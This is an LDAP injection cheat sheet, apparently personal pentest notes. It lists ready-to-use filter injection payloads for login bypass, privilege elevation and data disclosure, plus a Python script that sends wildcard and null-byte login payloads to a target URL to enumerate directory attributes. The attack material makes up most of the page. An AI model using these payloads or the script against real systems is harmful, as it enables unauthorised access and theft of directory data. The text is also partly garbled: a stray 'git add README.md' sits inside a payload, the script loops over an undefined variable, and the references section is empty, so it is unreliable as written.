# LDAP INJECTION

## What Is LDAP Injection?

Lightweight Directory Access Protocol (LDAP) injection is a vulnerability in which queries are constructed from untrusted input without prior validation or sanitization. LDAP uses queries constructed from predicates that involve the use of special characters (e.g., brackets, asterisks, ampersands, or quotes). Metacharacters such as these control the meaning of the query; thereby, affecting the type and number of objects retrieved from the underlying directory. If an attacker can submit input containing these control characters, they can alter the query and change the intended behavior.

 - LDAP Injection
   
   - Types of LDAP Injection Attacks

      - Access Control Bypass
      - Elevation of Privileges
      - Information Disclosure

   - Exploitation
   - Scripts

## Access Control Bypass

    (&(USER=Uname)(PASSWORD=Pwd)) (&(USER=john90)(&))(PASSWORD=Pwd))

## Elevation of Privileges

    "Information)(security_level=*))(&(directory=documents"
    (&(directory=Information)(security_level=*))(&(directory=Information)
    git add README.md(security_level=low))

## Information Disclosure

    (|(type=Resource1)(type=Resource2)) (|(type=Jeans)(uid=*))(type=T-Shirts)
    
 # Exploitation
 
  ## Example 1.
 
     user  = *)(uid=*))(|(uid=*
     pass  = password
     query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
     
# Scripts

 ## Discover valid LDAP fields

    #!/usr/bin/python3

    import requests
    import string

    fields = []

    url = 'https://URL.com/'

    f = open('dic', 'r') #Open the wordlists of common attributes
    wordl = f.read().split('\n')
    f.close()

    for i in world:
      r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
      if 'TRUE CONDITION' in r.text:
         fields.append(str(i))

    print(fields)
    
# References
